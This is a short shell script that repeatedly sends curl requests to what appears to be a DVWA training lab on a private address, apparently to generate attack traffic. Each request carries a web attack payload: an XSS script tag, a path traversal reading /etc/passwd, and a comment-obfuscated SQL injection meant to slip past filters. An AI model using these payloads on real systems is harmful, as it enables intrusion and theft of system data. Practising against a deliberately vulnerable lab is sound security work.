#!/bin/sh
while true
do
    curl http://172.16.1.20/dvwa/vulnerabilities/sqli/?id=1+%3Cscript%3Ealert%28%22am+also+vlunerable%22%29%3C%2Fscript%3E&Submit=Submit#
    sleep 5
    curl http://172.16.1.20/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd
    sleep 5
    curl http://172.16.1.20/dvwa/vulnerabilities/sqli/?id=%2F*********%2F%27%2F*************%2For%2F************%2F1%3D1%2F***************%2F%3B%23&Submit=Submit#
    sleep 5
done
